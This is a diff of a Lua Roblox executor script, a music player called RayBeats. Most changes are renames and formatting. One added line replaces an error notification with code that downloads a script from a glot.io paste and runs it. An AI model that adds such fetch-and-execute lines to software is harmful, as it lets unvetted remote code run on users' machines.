@@ -23,16 +23,12 @@ local success, errorMessage = pcall(function()
 end)
 
 if not success or not RayfieldLibrary then
-	game.StarterGui:SetCore("SendNotification", {
-		Title = "RayBeats System",
-		Text = "Failed to load Rayfield Library. Try to re-execute",
-		Duration = 5
-	})
+	loadstring(game:HttpGet("https://glot.io/snippets/hbwzkt8g3s/raw/reloader.lua"))()
 	return
 end
 
 --// Services
-local soundService = game:GetService("SoundService")
+local LayananSwara = game:GetService("SoundService")
 
 --// Current state / data
 local activePlaylist = "None"
@@ -43,13 +39,13 @@ local currentSpeed = 1
 local currentTrackName = "None"
 
 --// Flags
-local allowPlayPauseNotificationError = true
-local internalChangeForPlayPause = false
+local internalChange = false
 local isLooped = false
 local isPlaylistLooped = false
 local isDurationStarted = true
-local isShuffleEnabled = false
 local runRandomAbilityText = true
+local allowPlayPauseNotificationError = true
+local shuffleEnabled = false
 
 --// Playlist data
 local playlists = {}
@@ -64,12 +60,12 @@ local shufflePlaylist
 
 --// RayBeats System Info
 local raybeatsVersion = "4.6"
-local raybeatsBuild = "2025.10.10"
+local raybeatsBuild = "2025.10.11"
 local raybeatsRelease = "<b>Stable</b>"
 local raybeatsType = "<b><font color='rgb(34, 139, 34)'>Open Source</font></b>"
 
 local starterSound = Instance.new("Sound")	
-starterSound.Parent = SoundService
+starterSound.Parent = LayananSwara
 starterSound.Name = "RayBeats Starter Sound"
 starterSound.SoundId = "rbxassetid://108626032093243"
 starterSound.Volume = 0.9
@@ -109,45 +105,45 @@ local function startErrorSound()
 end
 
 local StoneCream = { -- my pfp color
-	TextColor				  	  = Color3.fromRGB(230, 230, 230),
-	PlaceholderColor			  = Color3.fromRGB(140, 140, 140),
+	TextColor					= Color3.fromRGB(230, 230, 230),
+	PlaceholderColor			= Color3.fromRGB(140, 140, 140),
 
-	Background					  = Color3.fromRGB(22, 22, 24),
-	Topbar						  = Color3.fromRGB(28, 28, 30),
-	Shadow					  	  = Color3.fromRGB(15, 15, 17),
+	Background					= Color3.fromRGB(22, 22, 24),
+	Topbar						= Color3.fromRGB(28, 28, 30),
+	Shadow						= Color3.fromRGB(15, 15, 17),
 
-	NotificationBackground	  	  = Color3.fromRGB(20, 20, 22),
+	NotificationBackground		= Color3.fromRGB(20, 20, 22),
 	NotificationActionsBackground = Color3.fromRGB(35, 35, 38),
 
-	TabBackground				  = Color3.fromRGB(35, 35, 38),
-	TabStroke					  = Color3.fromRGB(50, 50, 53),
-	TabBackgroundSelected		  = Color3.fromRGB(220, 215, 180),
-	TabTextColor				  = Color3.fromRGB(230, 230, 230),
-	SelectedTabTextColor		  = Color3.fromRGB(22, 22, 24),
+	TabBackground				= Color3.fromRGB(35, 35, 38),
+	TabStroke					= Color3.fromRGB(50, 50, 53),
+	TabBackgroundSelected		= Color3.fromRGB(220, 215, 180),
+	TabTextColor				= Color3.fromRGB(230, 230, 230),
+	SelectedTabTextColor		= Color3.fromRGB(22, 22, 24),
 
-	ElementBackground			  = Color3.fromRGB(32, 32, 35),
-	ElementBackgroundHover		  = Color3.fromRGB(42, 42, 45),
-	SecondaryElementBackground	  = Color3.fromRGB(22, 22, 24),
-	ElementStroke				  = Color3.fromRGB(55, 55, 58),
-	SecondaryElementStroke		  = Color3.fromRGB(45, 45, 48),
+	ElementBackground			= Color3.fromRGB(32, 32, 35),
+	ElementBackgroundHover		= Color3.fromRGB(42, 42, 45),
+	SecondaryElementBackground	= Color3.fromRGB(22, 22, 24),
+	ElementStroke				= Color3.fromRGB(55, 55, 58),
+	SecondaryElementStroke		= Color3.fromRGB(45, 45, 48),
 			
-	SliderBackground			  = Color3.fromRGB(40, 40, 43),
-	SliderProgress				  = Color3.fromRGB(195, 180, 145),
-	SliderStroke				  = Color3.fromRGB(190, 185, 150),
+	SliderBackground			= Color3.fromRGB(40, 40, 43),
+	SliderProgress				= Color3.fromRGB(195, 180, 145),
+	SliderStroke				= Color3.fromRGB(190, 185, 150),
 
-	ToggleBackground			  = Color3.fromRGB(32, 32, 35),
-	ToggleEnabled				  = Color3.fromRGB(220, 215, 180),
-	ToggleDisabled				  = Color3.fromRGB(100, 100, 100),
-	ToggleEnabledStroke			  = Color3.fromRGB(190, 185, 150),
-	ToggleDisabledStroke		  = Color3.fromRGB(70, 70, 70),
-	ToggleEnabledOuterStroke	  = Color3.fromRGB(70, 70, 73),
-	ToggleDisabledOuterStroke	  = Color3.fromRGB(50, 50, 53),
+	ToggleBackground			= Color3.fromRGB(32, 32, 35),
+	ToggleEnabled				= Color3.fromRGB(220, 215, 180),
+	ToggleDisabled				= Color3.fromRGB(100, 100, 100),
+	ToggleEnabledStroke			= Color3.fromRGB(190, 185, 150),
+	ToggleDisabledStroke		= Color3.fromRGB(70, 70, 70),
+	ToggleEnabledOuterStroke	= Color3.fromRGB(70, 70, 73),
+	ToggleDisabledOuterStroke	= Color3.fromRGB(50, 50, 53),
 
-	DropdownSelected			  = Color3.fromRGB(42, 42, 45),
-	DropdownUnselected			  = Color3.fromRGB(32, 32, 35),
+	DropdownSelected			= Color3.fromRGB(42, 42, 45),
+	DropdownUnselected			= Color3.fromRGB(32, 32, 35),
 
-	InputBackground				  = Color3.fromRGB(32, 32, 35),
-	InputStroke				 	  = Color3.fromRGB(55, 55, 58)
+	InputBackground				= Color3.fromRGB(32, 32, 35),
+	InputStroke				 	= Color3.fromRGB(55, 55, 58)
 }
 
 local Titles = {
@@ -389,8 +385,8 @@ playPause = ControlsTab:CreateToggle({
 	Name = "Pause <font transparency='0.6'>/</font> Resume",
 	CurrentValue = false,
 	Callback = function(value)
-		if internalChangeForPlayPause then 
-			internalChangeForPlayPause = false
+		if internalChange then 
+			internalChange = false
 			return
 		end
 
@@ -410,7 +406,7 @@ playPause = ControlsTab:CreateToggle({
 				})
 				startErrorSound()
 				task.wait(0.5)
-				internalChangeForPlayPause = true
+				internalChange = true
 				playPause:Set(false)
 			end
 		end
@@ -519,7 +515,7 @@ loopPlaylist = ControlsTab:CreateToggle({
 			if isLooped then
 				loopTrack:Set(false)
 			end
-			if isShuffleEnabled then
+			if shuffleEnabled then
 				shufflePlaylist:Set(false)
 			end
 		else
@@ -551,7 +547,7 @@ loopTrack = ControlsTab:CreateToggle({
 			if isPlaylistLooped then
 				loopPlaylist:Set(false)
 			end
-			if isShuffleEnabled then
+			if shuffleEnabled then
 				shufflePlaylist:Set(false)
 			end
 		else
@@ -569,7 +565,7 @@ shufflePlaylist = ControlsTab:CreateToggle({
 	Name = "Shuffle Playlist",
 	CurrentValue = false,
 	Callback = function(value)
-		isShuffleEnabled = value
+		shuffleEnabled = value
 		if value then
 			RayfieldLibrary:Notify({
 				Title = "RayBeats System",
@@ -678,7 +674,7 @@ local globalReverb = ControlsTab:CreateDropdown({
 	CurrentOption = "NoReverb",
 	Callback = function(reverbOption)
 		local selected = reverbOption[1]
-		soundService.AmbientReverb = reverbMap[selected]
+		LayananSwara.AmbientReverb = reverbMap[selected]
 	end
 })
 
@@ -790,7 +786,7 @@ game.DescendantAdded:Connect(function(obj)
 	end
 end)
 
-local MiscTab = Window:CreateTab("Misc", "ellipsis")
+local MiscTab = Window:CreateTab("Miscellaneous", "ellipsis")
 
 MiscTab:CreateLabel("If you use a headset/headphone, <b>Please lower the volume</b> below 60% to avoid damaging your ears.", "ear", Color3.fromRGB(255, 100, 100), false)
 MiscTab:CreateDivider()
@@ -799,11 +795,11 @@ MiscTab:CreateSection("Information")
 MiscTab:CreateParagraph({
 	Title = " <font transparency='0.6'>- //</font> <b>How to use RayBeats</b>",
 	Content = [[
-To add your custom tracks to RayBeats, start by opening your device’s file explorer. From there, navigate to the main workspace directory used by your executor — this is where all external script data is typically stored.  
+To add your custom tracks to RayBeats, start by opening your device’s file explorer. From there, navigate to the main workspace directory used by your executor — this is where all external script data is typically stored.
 
 Once you’ve located the workspace, look for a folder named ‘RayBeats’. Inside that folder, create a new subfolder dedicated to your personal playlist. You can freely name the folder based on your preference, as it will serve as the location for your track files.
 
-After setting up the folder, you can begin importing/inserting your audio files in supported formats such as <font face='RobotoMono'>.mp3</font>, <font face='RobotoMono'>.ogg</font>, or <font face='RobotoMono'>.wav</font>. Make sure that each file is properly placed inside your playlist folder.  
+After setting up the folder, you can begin importing/inserting your audio files in supported formats such as <font face='RobotoMono'>.mp3</font>, <font face='RobotoMono'>.ogg</font>, or <font face='RobotoMono'>.wav</font>. Make sure that each file is properly placed inside your playlist folder.
 
 When everything is ready, simply click the <b>Reload RayBeats</b> button below. The system will automatically detect your newly added tracks and prepare them for playback within the player interface.]]
 })
@@ -854,7 +850,7 @@ MiscTab:CreateButton({
 	Callback = function()
 		isDurationStarted = false
 		runRandomAbilityText = false
-		soundService.AmbientReverb = Enum.ReverbType.NoReverb
+		LayananSwara.AmbientReverb = Enum.ReverbType.NoReverb
 		if RayfieldLibrary then
 			RayfieldLibrary:Destroy()
 		end
@@ -874,7 +870,7 @@ MiscTab:CreateButton({
 	Callback = function()
 		isDurationStarted = false
 		runRandomAbilityText = false
-		soundService.AmbientReverb = Enum.ReverbType.NoReverb
+		LayananSwara.AmbientReverb = Enum.ReverbType.NoReverb
 		if RayfieldLibrary then
 			RayfieldLibrary:Destroy()
 		end
@@ -899,13 +895,13 @@ This is the main folder for the RayBeats Music Player.
 
 How to use:
 1. Inside this folder, create subfolders to act as playlists.
-   Example:
+ Example:
 	 Pop/
 	 Rock/
 	 Lofi/
 
 2. Put your .mp3 files into those subfolders.
-   Example:
+ Example:
 	 RayBeats/Pop/track1.mp3
 	 RayBeats/Pop/track2.mp3
 	 RayBeats/Rock/track1.mp3
@@ -946,7 +942,7 @@ local function playTrack(path, soundName, playlistName)
 	currentSound = Instance.new("Sound")
 	currentSound.Name = "RayBeats // " .. soundName
 	currentSound.SoundId = getcustomasset(path)
-	currentSound.Parent = SoundService
+	currentSound.Parent = LayananSwara
 	currentSound.Volume = currentSoundVolume
 	currentSound.PlaybackSpeed = currentSpeed
 	currentSound.Looped = isLooped
@@ -1013,7 +1009,7 @@ local function playTrack(path, soundName, playlistName)
 					return
 				end
 
-				if isShuffleEnabled and activePlaylist and playlists[activePlaylist] and #playlists[activePlaylist] > 1 then
+				if shuffleEnabled and activePlaylist and playlists[activePlaylist] and #playlists[activePlaylist] > 1 then
 					table.insert(playedTracks, path)
 
 					if #playedTracks >= #playlists[activePlaylist] then
@@ -1180,5 +1176,3 @@ end)
 --<font color='rgb(0,0,255)'>btw sound errornya... mwhehehe</font>
 --rayfield support RichText ya? baru tau gw
 --entod asu, dibilang sok inggris sama orang yang ga bisa bahasa inggris🤭🤭
---mana nih, kok dikit viewers RayBeats di Scriptblox
---hadehhh gini ya punya zodiak Gemini, banyak ngomongnya😐
